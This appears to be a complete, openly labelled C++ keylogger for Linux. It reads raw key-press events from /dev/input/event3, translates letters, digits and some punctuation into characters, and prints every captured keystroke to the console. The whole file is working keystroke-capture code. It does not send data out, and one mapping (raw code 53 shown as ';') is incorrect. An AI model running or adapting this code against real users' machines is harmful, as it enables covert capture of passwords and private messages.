#include <fcntl.h>
#include <iostream>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <ostream>
#include <unistd.h>

int main() {
  std::cout << "Keylogger is running...: \n" << std::endl;
  int fd = open("/dev/input/event3", O_RDONLY);
  if (fd == -1) {
    std::cout << "Arquivo inválido. \n";
    return 1;
  }

  input_event ev;

  while ((read(fd, &ev, sizeof(ev))) == sizeof(ev)) {
    if (ev.type == EV_KEY && ev.value == 1) {
      int code = static_cast<int>(ev.code);
      char c;

      switch (code) {
      case KEY_A:
        c = 'A';
        break;
      case KEY_B:
        c = 'B';
        break;
      case KEY_C:
        c = 'C';
        break;
      case KEY_D:
        c = 'D';
        break;
      case KEY_E:
        c = 'E';
        break;
      case KEY_F:
        c = 'F';
        break;
      case KEY_G:
        c = 'G';
        break;
      case KEY_H:
        c = 'H';
        break;
      case KEY_I:
        c = 'I';
        break;
      case KEY_J:
        c = 'J';
        break;
      case KEY_K:
        c = 'K';
        break;
      case KEY_L:
        c = 'L';
        break;
      case KEY_M:
        c = 'M';
        break;
      case KEY_N:
        c = 'N';
        break;
      case KEY_O:
        c = 'O';
        break;
      case KEY_P:
        c = 'P';
        break;
      case KEY_Q:
        c = 'Q';
        break;
      case KEY_R:
        c = 'R';
        break;
      case KEY_S:
        c = 'S';
        break;
      case KEY_T:
        c = 'T';
        break;
      case KEY_U:
        c = 'U';
        break;
      case KEY_V:
        c = 'V';
        break;
      case KEY_W:
        c = 'W';
        break;
      case KEY_X:
        c = 'X';
        break;
      case KEY_Y:
        c = 'Y';
        break;
      case KEY_Z:
        c = 'Z';
        break;
      case KEY_0:
        c = '0';
        break;
      case KEY_1:
        c = '1';
        break;
      case KEY_2:
        c = '2';
        break;
      case KEY_3:
        c = '3';
        break;
      case KEY_4:
        c = '4';
        break;
      case KEY_5:
        c = '5';
        break;
      case KEY_6:
        c = '6';
        break;
      case KEY_7:
        c = '7';
        break;
      case KEY_8:
        c = '8';
        break;
      case KEY_9:
        c = '9';
        break;
      case KEY_SPACE:
        c = ' ';
        break;
      case KEY_TAB:
        c = '\t';
        break;
      case KEY_ENTER:
        c = '\n';
        break;
      case 53:
        c = ';';
        break;
      case KEY_COMMA:
        c = ',';
        break;
      case KEY_DOT:
        c = '.';
        break;
      case KEY_BACKSPACE:
        std::cout << '\n' << "<BACKSPACE>" << std::endl;
        continue;
        break;
      default:
        std::cout << "\n<CHAR, " << code << '>' << std::endl;
        continue;
      }

      std::cout << c << std::flush;
    };
  }

  close(fd);

  return 0;
};
